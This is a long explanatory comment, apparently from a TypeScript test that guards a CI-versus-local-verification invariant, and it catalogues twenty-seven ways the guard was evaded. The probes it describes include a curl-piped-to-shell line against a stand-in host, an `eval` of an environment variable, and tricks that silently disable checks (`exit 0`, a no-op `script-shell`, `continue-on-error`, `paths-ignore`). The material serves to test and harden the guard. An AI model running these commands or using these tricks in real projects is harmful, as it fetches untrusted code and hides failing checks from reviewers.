/**
 * `pnpm verify` must be a superset of CI.
 *
 * This is the guard for a failure that already happened. Three builders each
 * finished green locally and each shipped a problem that CI caught, because
 * `pnpm verify` was quietly narrower than the workflow: it ran the tests but
 * not `pnpm build`, not `cargo build`, not `--locked`, and not the transcript
 * reproducibility check, which at the time existed only as an inline block in
 * `ci.yml` and so could not be run locally at all.
 *
 * A local gate that is weaker than the remote one does not save a round trip;
 * it hides the failure until the round trip is expensive. So the relationship
 * is asserted rather than maintained by hand: every gate command CI runs must be
 * reachable from the `verify` script. Adding a step to the workflow and
 * forgetting `verify` now fails here, at the cheapest possible moment.
 *
 * Deliberately *not* asserted: that the two run the same commands in the same
 * order, or that `verify` runs nothing extra. `verify` may be stricter. It may
 * never be looser.
 *
 * ## The question this file has to answer, and the times it asked a narrower one
 *
 * The wide question is **"what can make `pnpm verify` weaker than CI while every
 * string this file looks for is still present?"** Twenty-seven defects over
 * seven rounds each answered a narrower one, and each fix shipped the same
 * defect with a smaller mouth:
 *
 * 1. *One filename out of a directory the runner reads whole.* Every assertion
 *    derived from a single `readFileSync` of `.github/workflows/ci.yml`. GitHub
 *    Actions does not run a filename; it runs **every** file in that directory.
 *    Measured, not assumed: a second workflow carrying an unlisted gate, the
 *    crash-retry wrapper on a second job, and `cargo build` on a runner with no
 *    Tauri system dependencies left this file 16/16 green. Fixed by enumerating
 *    the directory, asserting over the union, and pinning the file list by name
 *    — see {@link WORKFLOW_FILES}.
 * 2. *A refusal that YAML quoting walked straight past.* The `uses:` refusals
 *    took the value as `(\S+)`, and a raw token carries its quotes, so
 *    `uses: "./.github/actions/foo"` matched no arm and was allowed. 17/17 green
 *    with the line added; refused with the quotes removed.
 * 3. *The same hole, one YAML spelling over.* `uses:` with the value on the next
 *    line, or as a block scalar (`>-`, `|-`), read as *not a `uses:` line at
 *    all*. 36/36 green, three spellings.
 * 4. *The key's spelling, not the value's.* Every fix above moved rightwards
 *    along the line — the value's quoting, the value's position, the value's
 *    block indicator. Nobody moved **leftwards**. The reader's key patterns
 *    demanded the bare bytes `run:` / `uses:` at that position, so
 *
 *        - name: Probe gate behind a quoted key
 *          "run": pnpm probe-unlisted-gate
 *        - "uses": ./.github/actions/probe-composite
 *
 *    returned `undefined` — *"this is not a `uses:` key"*, the one claim the
 *    reader was entitled to make — and no refusal fired. Measured on this tree
 *    at `run-start-2026-08-17`: 42/42 green with the quotes, and the identical
 *    two steps with **bare** keys take the file down at module load. A flow
 *    mapping, `- { run: pnpm probe-unlisted-gate }`, was invisible to the same
 *    two patterns for the same reason, and also 42/42 green. The
 *    `inJobs !== inFile` net under the old `jobsIn` could not catch either:
 *    both counts missed the step equally, so the arithmetic still balanced.
 *
 * ### Defect five: the setup exemption was a prefix test, not a whole-command test
 *
 * No unusual YAML at all. An existing step gains a shell `&&`:
 *
 *     - run: pnpm install --frozen-lockfile && pnpm probe-smuggled-gate
 *
 * The old reader read the whole line correctly; the escape was downstream, in an
 * exemption that dropped any command where `command.startsWith('pnpm install')`.
 * Everything after the `&&` rode in on the prefix. Applied to all three jobs
 * that install: 42/42 green. The second spelling used the apt block scalar's own
 * backslash continuation —
 *
 *           libssl-dev libsecret-1-dev \
 *           && ./scripts/probe-smuggled-gate.sh
 *
 * — where the rejoin that exists to make the reader see *more* (so a wrapped
 * `apt-get install` reads as one command instead of a list of package names) is
 * what made it see less: the rejoined string begins `sudo apt-get`, so
 * `startsWith('sudo apt-get')` exempted the script chained onto its end. Also
 * 42/42 green. **Note that a perfect YAML parser does not touch this one.** It
 * hands back the identical single scalar. The fix is that a `run:` value is now
 * split into the simple commands the shell would run, and **every one of them**
 * must be accounted for; the setup exemptions are exact whole-command strings in
 * {@link SETUP_COMMANDS}, not prefixes.
 *
 * ### Defect six: a mention in the verify chain is not an execution
 *
 * The larger surface, and the one no previous round touched. This guard compares
 * two documents, and every fix so far re-read only one of them. The `verify`
 * side was never framed as a reader at all: `matches.test(VERIFY)` asked *does
 * this gate's text occur anywhere in the concatenation of the `verify` script
 * body with the bodies of every script whose name is textually mentioned in it?*
 * It never asked whether the occurrence was a command, whether it was on the
 * success path, or whether its failure could fail `verify`. The expansion was a
 * `String.replace` over `/pnpm (?:run )?([\w:-]+)/g`, which follows a name
 * inside an echoed string exactly as it follows a name in a real command. So,
 * with the workflow left byte-identical:
 *
 *     "verify": "echo \"verify is temporarily a no-op. CI still runs: pnpm
 *      typecheck pnpm lint:rust pnpm test … cargo test --workspace --locked\""
 *
 * was 42/42 green, and the **same** no-op with the gate names deleted from the
 * echoed string was 13 failed / 29 passed. The two runs execute exactly the same
 * amount of verification — none. The only difference between 13 red and 42 green
 * was the presence of a string inside an `echo`. A file whose top line is
 * "`pnpm verify` must be a superset of CI" certified a `verify` that was the
 * empty set. The milder construction this repository practically invites, and
 * which was also 42/42 green, leaves the chain intact and suppresses one gate's
 * failure — `ci.yml`'s own comments record `test:harness` crashing on ~14% of
 * Windows runs, so a developer writing
 *
 *     … && (pnpm test:harness || echo "::warning:: flaky here") && …
 *
 * is the realistic version of this, not a contrived one. `verify` is then looser
 * than CI, which is the one relationship this file exists to forbid.
 *
 * ## Defects seven to ten: the fix for five and six carried the class down
 *
 * Measured on the tree that already carried the fixes above, each twice. Every
 * one of the four is the same shape as everything before it — **a question
 * asked about one spelling, one position or one half, and not about the
 * equivalent one next door.** Three of them are literally "this is refused
 * here, and the identical thing is admitted there".
 *
 * ### Defect seven: a gate row's two halves were never checked against each other
 *
 * A {@link CiGate} row is two halves answering two different questions. `ci` is
 * compared with the workflows by equality, so `unaccounted` forces it to track
 * whatever CI runs. `runs` is a predicate asked of the verify chain. Nothing
 * asked whether they were still about the same command. So: strengthen CI's
 * build gate to `cargo build --workspace --locked --all-targets`, update the
 * row's `ci` because the accounting check makes you, leave `runs` describing the
 * command CI stopped running — **91/91 green**, with `pnpm verify` running
 * strictly less than CI. Note what this needed: no unusual YAML, no shell trick,
 * no quoting. It is the ordinary consequence of strengthening a CI gate, which
 * is a thing people do. The fix is {@link rowDrift}: a row's predicate must
 * accept the row's own command, and the one row where the halves are meant to
 * differ says so with `delegatesTo` and has to earn it three ways.
 *
 * ### Defect eight: `run:` refused a GitHub expression and `uses:` did not
 *
 * `run:` has refused `${{ … }}` since defect four, on the stated grounds that
 * "what it runs is not in this file". The identical unreadable value in a
 * `uses:` was admitted without comment — it starts with neither `./` nor `../`
 * and matches no `.yml@`, so every arm of {@link refuseUses} decided a target it
 * had never read. `uses: ${{ env.PROBE_ACTION }}` on two steps: **91/91 green**.
 * Whether GitHub would run that step is not the question, for the same reason
 * given for the quoted key below: the value is not in the file, so a reader that
 * cannot see it must refuse rather than report that it found nothing harmful.
 *
 * ### Defect nine: the shell was refused on the step and admitted as a default
 *
 * A step whose `shell:` this reader cannot split is refused, because `&&` and
 * `;` mean nothing in a Python body. `defaults:` was listed in
 * {@link TOP_LEVEL_KEYS} as a key this reader "knows" — and never read. Three
 * lines at the top of the file:
 *
 *     defaults:
 *       run:
 *         shell: python
 *
 * set that same shell for every step in the workflow and left the file **91/91
 * green**, while the identical three lines *inside a job* are refused, because
 * {@link JOB_KEYS} has no `defaults`. Listing a key as known is not knowing what
 * it does. The reader now resolves the shell a step actually runs under, and
 * takes `defaults:` apart the way it takes jobs and steps apart.
 *
 * ### Defect ten: `continue-on-error:` was refused and `|| …` was not
 *
 * `modelOf` refuses a step with `continue-on-error: true`, saying a step whose
 * failure cannot fail the job "is therefore not a gate, and listing it as one
 * would overstate what CI proves". It asked only whether a *YAML key* said so,
 * never whether a *shell operator* said the same thing about the same step. The
 * flag was even computed — {@link shellCommands} returns it — and then dropped
 * by a `.map(c => c.text)`, an unread write. So `run: pnpm test:harness || pnpm
 * test:harness` was **91/91 green**: `unaccounted` stayed empty because both
 * halves are listed gates, and every row went on asserting that CI runs the
 * harness gate while CI would ignore its failure. Its reader is now *every CI
 * gate can actually fail the job it is listed in*.
 *
 * ## Defect eleven: the fix for eight was fixed one spelling at a time
 *
 * Measured on the tree carrying the fixes for seven to ten, each construction
 * twice. Defect eight said that `uses:` admitted a value it could not read.
 * The fix refused the `${{ … }}` spelling of that value — and left the *shape*
 * of the reader, which decided what a target was by testing the raw bytes for
 * `./`, `../` and `.yml@`. A target that missed all three patterns fell off the
 * end of {@link refuseUses} and was classified, in silence, as a third-party
 * action whose contents are out of reach on purpose.
 *
 * The same composite action, four spellings, each **117/117 green** while the
 * control `uses: ./.github/actions/probe-composite` was red twice on the same
 * tree:
 *
 *     - uses: ./.github/workflows/../actions/probe-composite/action.yml
 *     - uses: " ./.github/actions/probe-composite"
 *     - uses: .github/actions/probe-composite
 *
 * and at job level `uses: ./.github/workflows/../../shared-ci/gates.yml` with
 * `secrets: inherit`, which imports a whole reusable workflow whose jobs are in
 * no model here and contribute no commands to {@link COMMANDS}.
 *
 * Two things about this are worth keeping rather than the four inputs. First,
 * the reader asked a **textual** question ("does this string begin with `./`?")
 * where it owed a **referential** one ("which file does this name, and did I
 * read it?"), which is the same substitution as defect five's prefix test and
 * defect six's `matches.test(VERIFY)`. Second, the old doc comment stated the
 * allow-branch's justification outright — "enumerating the directory already
 * read it" — and that sentence was false for every input above. A justification
 * that is false for the branch's actual acceptance set is the defect, not a
 * description of it, so the fix is to make the sentence *checked*:
 * {@link readWorkflowSurface} now hands {@link modelOf} the set of files it
 * enumerated, and a local `uses:` is admitted only when it normalises onto a
 * member of that set. Everything else is refused by name, including targets a
 * more knowledgeable reader could probably classify.
 *
 * ## Defects twelve to sixteen: two models of FAILURE, no model of EXECUTION
 *
 * Measured on the tree carrying the fix for eleven, each construction twice,
 * each `141 passed (141)` with exit 0 twice — that tree's whole suite. Two
 * rounds of fixes turned both readers from text matchers into structure
 * parsers, and in doing so built two models of **failure propagation**:
 * `swallowedGates` on the workflow side, `gating` and `chainOf` on the verify
 * side. Neither acquired a model of **execution** — whether the command runs at
 * all — or of **value resolution** — whether the bytes of a scalar mean what
 * the document's own type system says they mean. All five below are one of
 * those two gaps.
 *
 * The workflow side was shielded from the first gap by an accident of design:
 * `unaccounted` is total, so a command that is not a listed gate reddens
 * wherever it sits. The verify side deliberately had no totality check —
 * "verify may be stricter" — and that is where twelve and thirteen walked in.
 *
 * ### Defect twelve: `gating` and `reached` were one fact, and they are two
 *
 * A gate on the **right** of a `||`. {@link shellCommands} flushes the group in
 * front of the operator with `gating=false` and the group behind it with
 * `gating=true`, so `"verify:harness": "pnpm test:click-harness || pnpm
 * test:harness"` spliced into the chain put `{command: 'pnpm test:harness',
 * gating: true}` into {@link VERIFY_CHAIN} and satisfied the row. In every
 * shell `pnpm test:click-harness` succeeds, so the harness gate — which CI runs
 * in two places, once wrapped in a crash-retry — never executed. **141/141
 * green.** (Two, not three: `ci.yml`'s `test-ts` runs `pnpm test:harness` and
 * `test-windows` runs `node scripts/ci-retry-vitest-crash.mjs pnpm
 * test:harness`. Measured by filtering {@link COMMANDS} for the string, which
 * returns those two entries and no third; `test:harness` occurs on a third line
 * of `ci.yml` and that one is inside a comment. An earlier version of this
 * sentence said three, which also contradicted *the crash-retry wrapper is
 * confined to the one job that needs it* below.) The mirror is the whole finding: the same two commands with the gate
 * moved to the *left* of the same `||` was `2 failed | 139 passed`. One
 * referent, two positions across one operator, opposite verdicts — and the
 * position the file **admitted** is the one where the gate does not run, while
 * the position it refused is the one where the gate at least runs.
 *
 * The fix is {@link ShellCommand.reached}, and the reason it is a second flag
 * rather than a wider `gating` is that the two facts come apart in opposite
 * directions. In `a && b`, `b` is skipped when `a` fails — and that run is red,
 * so nothing is hidden. In `a || b`, `b` is skipped when `a` succeeds — and
 * that run is **green**. Both sides now demand `gating && reached`, so the two
 * positions across the `||` get the same verdict, with different messages
 * naming which of the two failed.
 *
 * ### Defect thirteen: `verify` had no totality, and `exit 0` walked through it
 *
 * One edit to `package.json`: `"verify": "exit 0 && "` prefixed to the shipped
 * chain, byte for byte. `shellCommands` sees no `||`, `;` or `|`, so it flushes
 * the whole group gating; `chainOf` follows every `pnpm <name>` edge exactly as
 * before; `VERIFY_CHAIN` is the shipped one plus one entry `exit 0`; there was
 * no totality check on this document, so the extra entry cost nothing and every
 * row's filter was non-empty. **141/141 green**, and `pnpm verify` ran nothing
 * and exited 0. Established separately, without invoking pnpm or verify:
 * `sh -c 'exit 0 && echo GATE_RAN'`, the same under `bash -c`, and the same
 * under `cmd //c` each printed nothing and exited 0 — including `cmd.exe`,
 * which `ci.yml`'s own comments say is what pnpm hands script bodies to on
 * Windows.
 *
 * This is defect six one level down and in its own words. Six's headline was a
 * `verify` script that was one `echo` naming every gate, at 42/42 green, and
 * the stated fix was that `verify` is now "read as commands that execute, not
 * as text that mentions them". `exit 0 && …` is not a mention: every gate
 * behind it is a real, parsed, gating `pnpm` invocation in the program
 * position, and the file certified the empty set again. {@link chainOf}'s own
 * doc comment is where the frame broke — it claimed to return "every command
 * **reachable** from a script, by invocation rather than by mention", and it
 * returned every command *written*. In the round-two bytes the token `exit`
 * occurred on exactly two lines of the whole file, both of them doc comments
 * about exit *status*, and neither was a reader.
 *
 * The fix is not a list of control-flow builtins, because that is a list of
 * spellings and this file has lost to one of those every round. It is
 * {@link VERIFY_INVOCATIONS}: the verify chain gets the totality the workflow
 * always had, every command must be one this reader has been told runs and
 * returns, and an invocation nobody listed is refused by name exactly as an
 * unknown step key is. Round three wrote that list as seven program NAMES,
 * which is defect eighteen below; it is a list of programs *and argument
 * shapes* now.
 *
 * ### Defect fourteen: a boolean decided by five bytes instead of by the schema
 *
 * `continue-on-error: True` — capital T — on the `Typecheck` step of `static`.
 * `modelOf` refused a step only when `scalarOf(entry(step, 'continue-on-error'))
 * === 'true'`, an exact byte comparison against one of the three spellings YAML
 * 1.2's core schema resolves to boolean true. The capitalised spelling missed
 * it, the step was modelled as an ordinary gate, and *every CI gate can
 * actually fail the job it is listed in* — the case whose entire subject is
 * that a gate must be able to fail — stayed green about a step GitHub is
 * documented to ignore the failure of. **141/141 green** for one step and for
 * all three `static` gate steps, while the byte-identical step spelled `true`
 * was red twice at module load. The hand-set case for this refusal planted only
 * the lowercase spelling, which is what let it pin the bytes rather than the
 * meaning; the string `TRUE` appeared 0 times in the round-two file, and `True`
 * appeared 3 times, every one of them the first word of a doc comment ("True
 * when `command` is exactly `program` …") and none of them a value this reader
 * compared anything against.
 *
 * Round two found the same disease in {@link refuseUses}, which separated a
 * remote reusable workflow from a third-party action with a case-sensitive
 * `.yml@` pattern: `gates.YML@main` was 141/141 green twice where the
 * byte-identical `gates.yml@main` was red twice. That is not a one-off in one
 * regex — it is how this reader compared scalars generally, so adding a
 * case-insensitive flag to one pattern would have left the rest standing. Every
 * boolean this reader decides on now goes through {@link yamlBoolean}, which
 * resolves rather than compares, and a value it cannot resolve is refused
 * instead of being read as `false`.
 *
 * Whether GitHub's parser resolves `True` was not established here, and does
 * not need to be: if it does, admitting it is a silent green on a suppressed
 * gate; if it does not, refusing costs a review. That is this file's rule for
 * an error that is unsafe under one answer.
 *
 * ### Defect fifteen: the same key, refused on a step and unread on a job
 *
 * `continue-on-error: true` on the `static` **job**. `modelOf` refused the
 * step-level key by name and argued at length why it must; {@link JOB_KEYS}
 * listed the identical key as one this reader "knows" and nothing read it. Set
 * on `static` it takes `pnpm typecheck`, `cargo fmt --all --check` and `cargo
 * clippy` out of the set of things that can fail CI: **141/141 green**. That is
 * defect nine's own sentence — "listing a key as known is not knowing what it
 * does" — landing on the key next door, one round after nine was fixed. The
 * nearest thing to a disclosure was the header bullet saying this file does not
 * object to CI getting weaker, and that bullet was itself measurably false.
 *
 * ### Defect sixteen: a key parsed, consumed, and compared with nothing
 *
 * A gate written in plain text in `ci.yml`, under a key the reader reads and
 * then declines to read:
 *
 *     - uses: actions/github-script@v7
 *       with:
 *         script: |
 *           await exec.exec('pnpm', ['probe-unlisted-gate']);
 *           await exec.exec('cargo', ['test', '--workspace', '--locked', '--no-run']);
 *
 * `refuseUses` admitted the action through {@link isThirdPartyAction}; `with`
 * was a known step key whose value {@link parseWorkflowYaml} consumed — so the
 * totality claim held *textually*, every line was read — and which was then
 * compared with nothing. **141/141 green**, while the same two commands written
 * as an ordinary `run:` step in the same position was `1 failed | 140 passed`.
 * Same file, same job, same commands, verdict decided by which key the text sat
 * under.
 *
 * What the old header got wrong was the **size** it assigned this hole: "what
 * `isThirdPartyAction` accepts is the size of the remaining hole". Nothing in
 * that construction was out of reach; the commands were eight lines below the
 * `uses:` in a file the reader had just parsed. The hole was the acceptance set
 * **times whatever a workflow hands an admitted action under `with:`**, and an
 * open shape test cannot bound the second factor. Both factors are bounded now:
 * {@link THIRD_PARTY_ACTIONS} pins the five actions this repository uses, each
 * with the `with:` keys it may carry, and {@link refuseWith} refuses any other
 * input and any `with:` whose target this reader has not read. `secrets:` was
 * the third key listed as known and read nowhere, and it is refused by name.
 *
 * ## Defects seventeen to twenty-one: a totality owed over an invocation
 *
 * Measured on the tree carrying the fixes for twelve to sixteen, each
 * construction twice, each `172 passed (172)` with exit 0 twice — that file's
 * whole suite at that commit, which is not a claim about the repository's.
 *
 * Round three gave the verify side the totality it deliberately lacked and
 * described it, in the doc of the seven-name list this round replaced, as a
 * model of EXECUTION: each entry was said to name the fact that "this program
 * runs, returns an exit status, and hands control on, **and what it runs is
 * written in this repository**". What it built was a classifier for the **first
 * token of each simple command**. A command's effect is decided by four things —
 * which shell reads the body, which manifest a script name binds to, which other
 * bodies the package manager runs unasked, and what the arguments do — and the
 * net checked one of them. All four verify-side defects below are the same
 * substitution this file has made every round: a *textual* question asked where
 * a *referential* one was owed. The fifth is on the workflow side, on the key
 * next door to the one round three had just pinned.
 *
 * ### Defect seventeen: the lifecycle graph rides in on the setup exemption
 *
 * {@link SETUP_COMMANDS} exempts `pnpm install --frozen-lockfile` — the one
 * command CI runs in three jobs and `pnpm verify` runs in none — and justified
 * it by saying setup commands "fetch or install something and **cannot fail on
 * the state of the tree**". `pnpm install` also runs the root package's
 * `preinstall`, `install`, `postinstall` and `prepare`, and {@link chainOf}
 * starts at `verify` and has no notion of a lifecycle edge. One key added to
 * `package.json` — `"postinstall": "node scripts/run-bash.mjs
 * scripts/probe-postinstall-gate.sh"` — with `ci.yml` byte-identical, was
 * **172/172 green**, twice, while the byte-identical command written as an
 * ordinary step in `static` was `1 failed | 171 passed (172)`, exit 1 twice, at
 * *every gate command in the workflows is accounted for above* ("a new CI
 * command appeared"). Same command, same repository, verdict decided by which
 * key it sits under. This is not the direction the file was built for: it is CI
 * getting *wider* through a channel this file exempted by name.
 *
 * The exemption's stated justification was also measurably false. In a scratch
 * package on pnpm 10.33.0, a root `postinstall` exiting 1 made `pnpm install
 * --frozen-lockfile` print ` ELIFECYCLE  Command failed with exit code 1.` and
 * exit 1; with both bodies succeeding, the same install ran `postinstall` then
 * `prepare` and exited 0 while `pnpm verify` in that package ran neither. So the
 * exemption is conditional on a fact now rather than on a sentence: see
 * {@link LIFECYCLE_SCRIPTS}, and *the setup exemption for "pnpm install" covers
 * no work of its own*.
 *
 * ### Defect eighteen: the allowlist was a program-token test
 *
 * The old list named what it existed to refuse — a program that "runs text that
 * is not in this file (`eval`, `source`, `.`, `sh`, `bash`, `cmd`)" — and then
 * filtered on `command.program` alone, which is the first token. Prefixing the
 * shipped chain with
 *
 *     pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" &&
 *       node -e "eval(process.env.PROBE||'')" &&
 *
 * was **172/172 green**, twice: both programs are on the list, so `sh`, `eval`,
 * a pipe into `sh` and code taken from the environment were all in the chain,
 * all parsed, all gating and reached. The mirror is the finding — the same text
 * with `sh` in the program position was `1 failed | 171 passed (172)`, exit 1
 * twice, with the message that names the property being violated. One invocation, two spellings, opposite verdicts,
 * inside the function round three added to close exactly this. On its own it
 * does not empty `verify`, because none of these can make the parent script
 * shell exit 0 early; what it falsifies is the fact every entry was said to
 * name. {@link VERIFY_INVOCATIONS} is a program **and** an argument shape per
 * entry now.
 *
 * ### Defect nineteen: `chainOf`'s edge was a referential claim nobody checked
 *
 * Every row rests on "`pnpm typecheck` runs the body of `scripts.typecheck` in
 * the root `package.json`", and `chainOf` asserted it unconditionally — while
 * `cd` sat on round three's allowlist, admitted with a comment conceding that it
 * "changes what the commands after it do". A `verify` of `cd probe && pnpm
 * typecheck && … && cd ../src-tauri && cargo build …`, beside a
 * probe manifest whose eight scripts are `node -e ""`, was **172/172
 * green** with `ci.yml` untouched — and every one of the eight `pnpm <name>`
 * invocations in that chain binds to `probe`'s no-op scripts, so the only
 * commands left doing anything are the two `cargo` gates written in `verify`'s
 * own body. The runtime half
 * was measured in a scratch pair of packages, outside any worktree: with a root
 * `typecheck` printing `ROOT_TYPECHECK_RAN` and a `probe/typecheck` printing
 * `PROBE_TYPECHECK_RAN`, `sh -c 'cd probe && pnpm typecheck'` printed
 * `> probe@1.0.0 typecheck` and `PROBE_TYPECHECK_RAN`, and `grep -nx
 * ROOT_TYPECHECK_RAN` exited 1 — pnpm bound the name to `probe`'s manifest, not
 * the root's. The
 * mirror is again the finding — keep `cd probe`, keep the identical runtime
 * behaviour, rename one invocation to a script that exists in `probe`'s manifest
 * and not in the root's, and it is `1 failed | 171 passed (172)`, exit 1 twice,
 * at *verify reaches the CI gate: 'pnpm typecheck'*. One referent, two
 * spellings, opposite verdicts. See {@link VerifyCommand.rebound}.
 *
 * ### Defect twenty: one `.npmrc` line hands every gate to a shell that runs nothing
 *
 * Defect nine made `defaults.run.shell` a refusal, with the argument that "that
 * one changes how this reader may split a body at all". The verify side has the
 * identical setting one document over — pnpm's `script-shell`, which lives in
 * this repository's own tracked `.npmrc` — and had no reader for it: the token
 * `npmrc` occurred **0 times** in this file. Appending
 *
 *     script-shell=C:/Program Files/Git/usr/bin/true.exe
 *
 * to `.npmrc`, with `package.json` and `ci.yml` byte-identical, was **172/172
 * green**, exit 0 twice. Every `pnpm <script>` body is then handed to a program
 * that ignores its argument and exits 0 — measured in a scratch package on pnpm
 * 10.33.0, where `pnpm verify` printed the body and neither of its two gate
 * lines, exit 0, against a control that printed both. The blast radius includes
 * this guard: under that `.npmrc`, CI's `pnpm test` step also runs nothing and
 * exits 0. A file whose top line is "`pnpm verify` must be a superset of CI"
 * certified, at full green, a tree in which neither executes anything at all —
 * defect six's own relationship, reached through a file rather than through a
 * script body. {@link NPMRC_KEYS} makes that document total the way
 * {@link TOP_LEVEL_KEYS} makes the workflow total.
 *
 * ### Defect twenty-one: `env:` is `with:` spelled the other way
 *
 * GitHub passes a `with:` input to an action as the environment variable
 * `INPUT_<NAME>`. Defect sixteen's fix pinned five actions and the `with:` keys
 * each may carry and called that **the** bound on what a workflow hands an
 * admitted action; `refuseWith` read one of the two spellings.
 * `env: INPUT_RUN_INSTALL:` on the pinned `pnpm/action-setup@v4` step of
 * `static` was **172/172 green**, twice, while the byte-equivalent
 * `with: run_install:` on the identical step took that file down at module load,
 * exit 1 twice, by name. Nothing here
 * disclosed it: `env:` appeared in three header sentences, every one of them
 * reasoning about *command text*, and a `uses:` step has none — while `INPUT_`
 * appeared 0 times. Whether the runner really consumes it that way is **not**
 * established here and the refusal does not turn on it; see
 * {@link refuseEnvOnUses}.
 *
 * ## Defects twenty-two to twenty-seven: which documents exist, and whether the run happens
 *
 * Measured on the tree carrying the fixes for seventeen to twenty-one, each
 * construction twice, each `181 passed (181)` with exit 0 twice — that file's
 * whole suite at that commit, which is not a claim about the repository's. Each
 * is red twice on the tree this comment ships in; the counts are with the
 * defect's own entry.
 *
 * Round five's adversary reported that it could not get through either totality
 * net — `unaccounted`'s whole-string equality on the workflow side,
 * {@link unclassifiedVerifyCommands} on the verify side — and that everything it
 * did land sat at one boundary this file had never drawn: **the reader is total
 * inside each document it opens, and had no rule at all about which documents
 * exist, or about whether the run they describe happens.** All six below are
 * that boundary, and none of them is inside a document this file had opened.
 *
 * - **Twenty-two: a list of files to open is not a claim about a directory.**
 *   {@link SHELL_SETTING_FILES} names three files and refuses what it cannot
 *   parse; a *fourth* name is not refused, it is invisible. A tracked
 *   `.pnpmfile.cjs` — a JavaScript hook pnpm runs during `pnpm install`, the one
 *   command {@link SETUP_COMMANDS} exempts by name — was 181/181 green, while
 *   the byte-equivalent work written as the manifest key {@link LIFECYCLE_SCRIPTS}
 *   closed was red. Fixed by pinning the membership of the repository root:
 *   {@link ROOT_FILES}.
 * - **Twenty-three: the manifest was opened for one key and configured in
 *   another.** `package.json` was bound as `{ scripts }`, and the `pnpm` block
 *   already in the tree — whose `onlyBuiltDependencies` decides which dependency
 *   install scripts run, factor 3 below — was read past in silence. A sibling
 *   `overrides` key was 181/181 green. Fixed by {@link MANIFEST_KEYS}.
 * - **Twenty-four: a resolver's own doc described a refusal it did not make.**
 *   {@link yamlBoolean}'s comment said a quoted `"true"` resolved to
 *   `undefined`; `parseWorkflowYaml` strips the quotes before it is called, so
 *   `continue-on-error: 'false'` took the allow-branch at 181/181 green. Fixed
 *   by {@link yamlBooleanOf}, which resolves a boolean from a plain scalar only.
 * - **Twenty-five: `on:` decides whether any of this runs.** `paths-ignore:
 *   ['**']` on `push:` and `pull_request:`, with every gate byte-identical, was
 *   181/181 green against a CI that runs for no change at all. Fixed by
 *   {@link CI_TRIGGERS}.
 * - **Twenty-six: `needs:` as a name, not as an ordering.** Renaming the
 *   `static:` job and leaving its three `needs: static` lines makes GitHub
 *   reject the whole file, so no gate runs on any event; 181/181 green. The
 *   header's licence for `needs` — "can only name, remove or reorder work" — is
 *   true of an ordering key and false of an unresolvable name. Fixed in
 *   {@link modelOf} against the job names of the file itself.
 * - **Twenty-seven: `env:` merges downwards and the refusal bound one scope of
 *   three.** Round four's finding, unfixed for a round: {@link refuseEnvOnUses}
 *   only ever sees an `env:` beside a `uses:`, and GitHub merges the
 *   workflow-level and job-level blocks into every step. Both outer scopes were
 *   181/181 green with the same two lines the step-level refusal rejects. Fixed
 *   by {@link refuseActionInputEnv}, at all three scopes and unconditionally.
 *
 * ## What the reader is now, on both sides
 *
 * Both documents are read as **structure**, and both readers are *total*: every
 * line of a workflow and every character of a script body is either consumed by
 * a construct the reader understands or **refused by name**. Silence about
 * something it could not take apart is the failure mode of every defect above,
 * and it is now unreachable rather than merely unlikely.
 *
 * - **The workflow is parsed as YAML** (a block subset — see
 *   {@link parseWorkflowYaml}), so a key is a key whatever its quoting, and a
 *   construct outside the subset throws instead of being skipped. Keys are
 *   normalised, so `"run":` and `run:` are one thing; flow mappings, anchors,
 *   aliases, tags, tabs and multi-document files are refused. Job and step keys
 *   are then checked against a list of what this reader knows how to reason
 *   about, and an unknown key is refused rather than ignored — that is the
 *   general form of defect four, which was one particular unknown spelling.
 * - **Commands are parsed as shell** (see {@link shellCommands}), so a `run:`
 *   value is a *list* of simple commands rather than one string, and each of
 *   them has to be accounted for. Constructs whose effect this reader cannot
 *   compute — command substitution, subshells, background jobs, any `$`
 *   expansion — are refused, not guessed at.
 * - **`verify` is read as commands that execute**, not as text that mentions
 *   them. {@link VERIFY_CHAIN} is built by following real invocations: a
 *   segment whose program is `pnpm` and whose script name is a key in
 *   `package.json` expands to *that script's* commands. An argument inside an
 *   `echo` is an argument. Each command carries **two** facts computed from the
 *   shell operators around it, and defect twelve is that they were one:
 *   **gating** — whether its failure fails `verify`, so a gate behind `||` or
 *   after `;` or `|` is present and does not count — and **reached** — whether
 *   a *green* run executes it at all, so a gate on the right of a `||` is
 *   present, would fail the run if it ran, and does not run. Both compose along
 *   every `pnpm <script>` edge. Each row of {@link CI_GATES} says what it needs
 *   as a predicate over a *parsed* command, so the row for `pnpm typecheck`
 *   asks for a command whose program is `pnpm` and whose script is `typecheck`
 *   — a question `echo` cannot answer however its arguments are spelled.
 * - **The verify chain is total too**, which it deliberately was not. Every
 *   command in it must match an entry of {@link VERIFY_INVOCATIONS} — a program
 *   **and** an argument shape — whose entries name one fact each row above
 *   assumes and none of them checked: *this invocation runs, returns an exit
 *   status, hands control on, and what it runs is written in this repository*.
 *   That is defect thirteen: `exit 0 && <the whole shipped chain>` is twelve
 *   top-level simple commands, which {@link chainOf} expands to twenty-four,
 *   every one of them parsed, gating and reached, and it runs none of them.
 *   (Measured on the tree this comment ships in, by handing `chainOf` the
 *   shipped `verify` body with `exit 0 && ` in front: 24 chain entries, 24
 *   gating, 12 top-level, 8 of those `pnpm` invocations; the unspliced chain is
 *   23 and 11. An earlier version of this bullet said "thirteen real gating
 *   invocations", which is not a number this tree returns.) "Stricter" still
 *   means verify may run gates CI does not; it no longer means verify may run
 *   invocations this reader has never classified.
 *
 * ### What this still cannot see, stated so nobody over-reads a green
 *
 * It compares *invocations at the command level*. It does not know what an
 * invocation does, and it does not read anything an invocation reads. All of
 * these keep every assertion here green:
 *
 * - **Rewriting what a gate is.** `"test": "vitest run --passWithNoTests
 *   --exclude src"` is still the `pnpm test` gate to this file. So is a change
 *   to `vite.config.ts`'s `test.include`, or to a vitest config a gate points
 *   at, or to `scripts/run-bash.mjs`, `scripts/check-transcripts.sh` or
 *   `scripts/secret-scan.sh`. The *argument list* of a gate is now pinned; the
 *   *definition* of the gate is not, and pinning it is a different guard.
 * - **`working-directory:` and `env:` on a `run:` step.** Both change what a
 *   command does without changing its text. They are read as known step keys and
 *   their values are not compared with anything. `defaults.run.working-directory`
 *   is the same, and is admitted for the same reason; `defaults.run.shell` is
 *   not, because that one changes how this reader may split a body at all —
 *   defect nine. This is the boundary to watch: it is drawn at *what changes how
 *   the reader reads*, not at *what changes what runs*, and the second of those
 *   is the wider question. A `working-directory` that moves a gate to a tree with
 *   a different `Cargo.toml` would not be seen here.
 *
 *   **`env:` on a `uses:` step is NOT in this list any more** — it is refused,
 *   and defect twenty-one is that it sat here without ever being covered by the
